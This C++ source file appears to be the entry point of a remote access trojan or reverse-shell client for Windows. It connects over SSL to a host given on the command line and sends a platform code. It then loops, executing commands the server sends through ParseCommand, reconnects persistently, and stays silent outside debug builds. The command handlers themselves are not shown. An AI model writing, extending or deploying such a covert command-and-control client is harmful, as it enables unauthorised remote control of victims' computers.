#include "headers.hpp"
#include "Client.hpp"
#include "Misc.hpp"

int main(int argc, char **argv){
	if(argc != 3){
		return 0;
	}
	WSADATA wsa;
	if(WSAStartup(MAKEWORD(2,2), &wsa) != 0){
	   #ifdef _DEBUG
	   error();
	   #endif
	   exit(0);
	}
	SSL_library_init();
	#ifdef _DEBUG
	ERR_load_BIO_strings();
	SSL_load_error_strings();
	#endif
	Client *Cli = new Client;
	char *cBuffer = new char[1024];
	int iBytes = 0;
	while(Cli->isKeepRunning){
		if(Cli->Connect(argv[1], argv[2])){
			#ifdef _DEBUG
			std::cout<<"Connected!!!\n";
			#endif
			TryAgain:
			iBytes = SSL_write(Cli->sslSocket, "00", 2); //01 linux 00 windows
			if(iBytes > 0){ 
				while(1){
					iBytes = SSL_read(Cli->sslSocket, cBuffer, 1023);
					if(iBytes > 2){
						cBuffer[iBytes] = '\0';
						if(!Cli->ParseCommand(cBuffer)){
							Cli->CloseConnection();
							Cli->isKeepRunning = false;
							break;
						}
					} else {
						if(!Cli->CheckSslReturnCode(iBytes)){
							Cli->CloseConnection();
							break;
						}
						Sleep(100);
					} 
				}
			} else {
				if(!Cli->CheckSslReturnCode(iBytes)){
					Cli->CloseConnection();
					break;
				}
				Sleep(1000);
				goto TryAgain;
			}
		} else {
			#ifdef _DEBUG
			Sleep(3000);
			#else
			Sleep(6000);                  
			#endif
			Cli->CloseConnection();
			//break;
		}
	}
	Misc::Free(cBuffer, 1024);
	delete Cli;
	Cli = nullptr;
	#ifdef _DEBUG
	ERR_free_strings();
	#endif
	EVP_cleanup();
	WSACleanup();
	return 0;
}
